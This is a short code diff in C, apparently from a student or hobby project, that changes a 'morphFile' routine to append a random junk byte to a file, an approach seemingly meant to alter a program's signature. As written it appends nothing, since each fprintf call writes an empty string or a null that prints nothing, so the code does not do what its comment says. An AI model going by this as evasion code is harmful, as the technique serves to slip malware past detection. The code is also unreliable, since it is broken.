@@ -11,9 +11,10 @@
 
 void morphFile() {
 	FILE *fp;
+	int randNum;
 
 	// Open the file MtoX.c to morph
-	fp = fopen("xichigan","rb+");
+	fp = fopen("xichigan","a");
 
 	// Read in the file 1 character at a time and print the value changed by key
 	if (fp == NULL){
@@ -21,9 +22,42 @@ void morphFile() {
 		exit(0); // Exit with no error to target
 	}
 
-	// Prepend assembly code
+	// Append 1 byte of junk binary to the end of the file
+	srand(time(NULL));
+	randNum = rand() % 10;
 
-	// Append assembly code
+	switch(randNum){
+		case 0:
+			fprintf(fp, "\0");
+			break;
+		case 1:
+			fprintf(fp, "");
+			break;
+		case 2:
+			fprintf(fp, "");
+			break;
+		case 3:
+			fprintf(fp, "");
+			break;
+		case 4:
+			fprintf(fp, "");
+			break;
+		case 5:
+			fprintf(fp, "\0");
+			break;
+		case 6:
+			fprintf(fp, "");
+			break;
+		case 7:
+			fprintf(fp, "");
+			break;
+		case 8:
+			fprintf(fp, "");
+			break;
+		case 9:
+			fprintf(fp, "");
+			break;
+	}
 
 	fclose(fp);
 }
